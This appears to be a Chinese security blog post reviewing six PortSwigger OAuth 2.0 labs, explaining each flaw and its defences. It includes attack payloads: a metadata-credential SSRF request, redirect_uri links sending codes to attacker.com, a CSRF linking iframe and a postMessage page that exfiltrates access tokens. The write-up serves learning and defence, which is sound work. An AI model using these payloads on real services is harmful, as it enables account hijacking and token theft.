#  OAuth 2.0 安全攻防：从 Portswigger 六大实验看认证漏洞挖掘  
原创 X
                    X  XiAnG学安全   2026-02-04 07:19  
  
   
  
# OAuth 2.0 安全攻防：从 Portswigger 六大实验看认证漏洞挖掘  
  
OAuth 2.0 已经成为现代 Web 应用的标准认证协议，但在便捷的单点登录背后，隐藏着诸多安全隐患。本文基于 Portswigger Web Security Academy 的六大 OAuth 实验，系统梳理攻击手法、漏洞原理与防御方案，帮助安全从业者建立完整的 OAuth 攻防知识体系。  
## 一、OAuth 2.0 基础：你真的了解授权流程吗？  
  
在深入漏洞之前，我们先厘清 OAuth 2.0 的两种核心模式：  
### 1.1 授权码模式（Authorization Code）  
  
**最安全、最推荐的流程**  
```
用户点击登录 → 授权服务器返回 code → 后端用 code+client_secret 换 token
```  
- • 授权码（code）通过浏览器传递  
  
- • Access token **只在后端通道**  
流转  
  
- • 支持 PKCE 扩展，防止 CSRF  
  
### 1.2 隐式授权模式（Implicit）  
  
**为单页应用（SPA）设计，但安全性较差**  
```
用户点击登录 → 授权服务器直接返回 access_token（在 URL #fragment 中）
```  
- • Access token **暴露在浏览器地址栏**  
  
- • 通过 JavaScript 提取使用  
  
- • **OAuth 2.1 已废弃此模式**  
  
## 二、六大实验全景对比  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">实验名称</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">难度</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">核心漏洞</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">攻击目标</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">关键利用点</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">Authentication bypass via OAuth implicit flow</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">⭐ Apprentice</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">客户端未验证 token 与用户绑定关系</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">任意用户账户</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">替换 email 参数，token 不变</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">Forced OAuth profile linking</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">⭐⭐ Practitioner</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">缺失 state 参数，CSRF 攻击</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">已登录用户的账户绑定</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">预获取 code，诱使 admin 完成回调</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">OAuth account hijacking via redirect_uri</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">⭐⭐ Practitioner</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">redirect_uri 无白名单验证</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">授权码（code）</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">构造恶意 redirect_uri 外泄 code</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">Stealing OAuth access tokens via an open redirect</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">⭐⭐ Practitioner</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">redirect_uri 目录遍历 + 开放重定向</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Access token</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">利用 ../ 遍历到跳转页面，外泄 token</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">Stealing OAuth access tokens via a proxy page</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">⭐⭐ Practitioner</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">redirect_uri 目录遍历 + 不安全 postMessage</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">Access token</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">iframe 劫持 + postMessage 跨域泄漏</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">SSRF via OpenID Dynamic Client Registration</span></strong></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">⭐⭐ Practitioner</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">动态注册端点无认证 + logo_uri SSRF</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">云环境元数据（169.254.169.254）</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">注册恶意客户端，触发二阶 SSRF</span></section></td></tr></tbody></table>  
## 三、六大攻击向量深度解析  
### 3.1 攻击向量一：授权服务器配置缺陷  
  
**代表实验：SSRF via OpenID Dynamic Client Registration**  
  
**漏洞原理**  
：  
- • 动态客户端注册端点（/reg  
）**无需认证**  
即可访问  
  
- • logo_uri  
 参数指定的 URL 会被授权服务器访问以获取 logo  
  
- • 攻击者指向内网地址（169.254.169.254  
），造成 SSRF  
  
**利用代码**  
：  
```
{    "redirect_uris": ["https://example.com"],    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}
```  
  
**防御方案**  
：  
1. 1. 注册端点要求 Initial Access Token  
  
1. 2. 严格校验所有 URI 参数（白名单域名）  
  
1. 3. 禁止访问内网网段（169.254.0.0/16, 10.0.0.0/8 等）  
  
### 3.2 攻击向量二：redirect_uri 劫持  
  
**代表实验：OAuth account hijacking via redirect_uri**  
  
**漏洞原理**  
：  
- • 授权服务器**未验证**  
 redirect_uri 或验证不严格  
  
- • 攻击者将 redirect_uri 改为自己的服务器  
  
- • 受害者授权后，code/token 被发送到攻击者服务器  
  
**利用技巧**  
：  
```
# 恶意授权链接GET /auth?client_id=xxx&redirect_uri=https://attacker.com/callback&response_type=code
```  
  
**进阶攻击**  
：目录遍历 + 开放重定向组合  
```
# 先利用 ../ 遍历到站内开放重定向点redirect_uri=https://victim.com/oauth-callback/../post/next?path=https://attacker.com
```  
  
**防御方案**  
：  
1. 1. **精确匹配**  
：注册时登记的 URI 必须与请求完全一致  
  
1. 2. **禁止通配符**  
：不使用 *  
 或部分匹配  
  
1. 3. **PKCE 强制**  
：即使 code 被截获也无法使用  
  
### 3.3 攻击向量三：CSRF 绑定攻击  
  
**代表实验：Forced OAuth profile linking**  
  
**漏洞原理**  
：  
- • OAuth 流程**缺失 state 参数**  
（CSRF Token）  
  
- • 攻击者预先将**自己的社交账户**  
绑定到**受害者的本地账户**  
  
**攻击流程**  
：  
```
1. 攻击者登录自己的账户，开始 OAuth 绑定流程2. 在授权回调前截获 code（Burp Drop）3. 构造 CSRF 页面，诱导已登录的 admin 访问   <iframe src="/oauth-linking?code=ATTACKER_CODE">4. admin 的浏览器携带 session 完成绑定5. 攻击者现在可用自己的社交账户登录 admin 账户
```  
  
**关键点**  
：state 参数确保授权请求和回调的会话一致性  
  
**防御方案**  
：  
- • **强制 state 参数**  
：随机不可预测，绑定到用户会话  
  
- • **验证一致性**  
：回调时检查 state 是否匹配  
  
### 3.4 攻击向量四：隐式流令牌泄漏  
  
**代表实验：Authentication bypass via OAuth implicit flow**  
  
**漏洞原理**  
：  
- • 隐式流将 access_token 放在 URL fragment 中（#access_token=xxx  
）  
  
- • 客户端应用**未验证 token 归属**  
，只检查 token 有效性  
  
- • 攻击者用**自己的有效 token**  
 + **受害者的 email**  
 完成登录  
  
**利用代码**  
：  
```
POST /authenticate{    "email": "victim@example.com",  // 篡改    "username": "attacker",    "token": "ATTACKER_VALID_TOKEN"  // 自己的 token}
```  
  
**防御方案**  
：  
- • **弃用隐式流**  
：改用授权码模式 + PKCE  
  
- • **服务端验证**  
：用 token 向 OAuth 服务器请求用户信息，与提交的身份比对  
  
### 3.5 攻击向量五：代理页面劫持  
  
**代表实验：Stealing OAuth access tokens via a proxy page**  
  
**漏洞原理**  
：  
- • 站内存在**不安全的 postMessage**  
 实现（如评论表单）  
  
- • parent.postMessage(data, '*')  
 向任意域发送消息，包含当前 URL（含 token）  
  
**攻击链**  
：  
```
redirect_uri 遍历到 comment-form 页面 → 页面加载时自动 postMessage 发送 location.href（含 #access_token） → 攻击者的 exploit 页面作为 parent 接收消息 → 外泄 token
```  
  
**利用代码**  
：  
```
<!-- 攻击者页面 --><iframe src="https://oauth-server/auth?...&redirect_uri=../post/comment/comment-form&response_type=token"></iframe><script>window.addEventListener('message', e => {    fetch('/log?token=' + e.data.data)  // 捕获 token}, false)</script>
```  
  
**防御方案**  
：  
- • **指定 targetOrigin**  
：postMessage(data, 'https://trusted.com')  
  
- • **验证 event.origin**  
：接收方检查消息来源  
  
- • **不传输敏感数据**  
：避免在 postMessage 中发送 token、session 等  
  
### 3.6 攻击向量六：开放重定向组合攻击  
  
**代表实验：Stealing OAuth access tokens via an open redirect**  
  
**与代理页面的区别**  
：利用跳转而非 postMessage  
  
**攻击链**  
：  
```
redirect_uri=../post/next?path=https://attacker.com → 授权后跳转到 /post/next?path=attacker.com#token → 开放重定向到 attacker.com?token=xxx（从 Referer 或 JS 提取）
```  
  
**防御方案**  
：  
- • **修复开放重定向**  
：path 参数只允许站内相对路径  
  
- • **多重验证**  
：跳转前检查 URL 是否在白名单  
  
## 四、漏洞挖掘实战技巧  
### 4.1 信息收集：发现 OAuth 端点  
```
1. 访问 /.well-known/openid-configuration   → 获取 authorization_endpoint, token_endpoint, registration_endpoint   2. 检查登录按钮的 href   → 分析 client_id, redirect_uri, response_type, scope   3. 查看页面源码和 JS 文件   → 寻找 postMessage, addEventListener, window.location 等关键词
```  
### 4.2 重定向测试矩阵  
  
<table><thead><tr><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">测试 payload</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">预期结果</span></section></th><th style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;background: rgba(0, 0, 0, 0.05);"><section><span leaf="">漏洞判断</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">redirect_uri=https://evil.com</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">报错或忽略</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">安全</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">redirect_uri=https://victim.com.evil.com</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">报错或忽略</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">安全（检查域名边界）</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">redirect_uri=https://victim.com/@evil.com</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">报错或忽略</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">安全（检查 @ 符号）</span></section></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">redirect_uri=https://victim.com/oauth/../evil</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">成功</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">路径遍历漏洞</span></strong></td></tr><tr><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><code style="font-size: 90%;color: #d14;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">redirect_uri=https://victim.com/oauth-callback/../post/next?path=evil.com</span></code></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><section><span leaf="">成功</span></section></td><td style="border: 1px solid #dfdfdf;padding: 0.25em 0.5em;color: #3f3f3f;word-break: keep-all;"><strong style="color: #0F4C81;font-weight: bold;font-size: inherit;"><span leaf="">目录遍历 + 开放重定向</span></strong></td></tr></tbody></table>  
### 4.3 关键参数检查清单  
- •**state**  
：是否存在？是否随机？是否验证？  
  
- •**redirect_uri**  
：是否严格匹配？是否允许遍历？  
  
- •**scope**  
：是否包含敏感权限？是否可修改？  
  
- •**response_type**  
：是否为 token（隐式流）？  
  
- •**client_id**  
：是否可枚举？是否与特定 redirect_uri 绑定？  
  
- •**PKCE**  
：code_challenge 是否存在？  
  
## 五、防御体系构建  
### 5.1 授权服务器（OP）安全  
```
redirect_uri 策略:  - 精确字符串匹配（非通配符）  - 禁止 IP 地址、localhost（生产环境）  - 强制 HTTPS  - 注册时验证所有权（DNS TXT 记录或文件验证）令牌策略:  - 短有效期（access_token: 15分钟）  - 一次性授权码（code 10分钟内用完即废）  - 强制 PKCE（RFC 7636）  - 绑定 client_id + redirect_uri + code端点保护:  - /reg 要求 Initial Access Token  - 限制 logo_uri, jwks_uri 等只能访问公网  - 禁止 169.254.0.0/16, 10.0.0.0/8 等内网地址
```  
### 5.2 客户端应用（RP）安全  
```
// 1. 严格验证 stateconst savedState = sessionStorage.getItem('oauth_state');const returnedState = new URLSearchParams(window.location.search).get('state');if (savedState !== returnedState) {    throw new Error('Invalid state parameter');}// 2. 服务端交换 token（不要用前端隐式流）const tokenResponse = await fetch('/backend/token', {    method: 'POST',    body: JSON.stringify({ code: authCode })});// 3. 验证 token 归属const userInfo = await fetch('/oauth-server/me', {    headers: { 'Authorization': 'Bearer ' + token }});if (userInfo.email !== submittedEmail) {    throw new Error('Token does not match user');}// 4. 安全的 postMessage// 发送方parent.postMessage(data, 'https://trusted-parent.com');// 接收方window.addEventListener('message', (e) => {    if (e.origin !== 'https://trusted-child.com') return;    // 处理消息});
```  
### 5.3 安全响应头  
```
# 防止点击劫持（OAuth 流程必须在顶层窗口）Content-Security-Policy: frame-ancestors 'none';# 防止 Referer 泄漏 tokenReferrer-Policy: no-referrer;# 安全的 CookieSet-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict;
```  
## 六、总结：OAuth 安全黄金法则  
1. 1. **永远不要信任前端**  
：敏感操作（token 交换、用户身份验证）必须在服务端完成  
  
1. 2. **验证一切输入**  
：redirect_uri、state、code 都必须严格验证  
  
1. 3. **最小权限原则**  
：申请最小必要的 scope，避免 openid profile email  
 全开  
  
1. 4. **监控异常行为**  
：检测短时间内大量 code 兑换失败（可能是暴力破解或重放攻击）  
  
1. 5. **及时升级协议**  
：废弃隐式流，迁移到 PKCE + 授权码模式  
  
OAuth 2.0 的安全不仅在于协议本身，更在于**实现的细节**  
。希望通过本文的实验复盘，你能建立起系统化的 OAuth 漏洞挖掘与防御能力。  
  
**参考资源**  
：  
- • Portswigger Web Security Academy OAuth 系列实验  
  
- • RFC 6749 (OAuth 2.0), RFC 7636 (PKCE), RFC 8252 (Native Apps)  
  
- • OAuth 2.0 Security Best Current Practice (draft-ietf-oauth-security-topics)  
  
本文仅供安全技术研究与学习，请勿用于非法用途。  
  
**点赞、在看、转发，三连支持一下！**  
 👍  
  
   
  
  
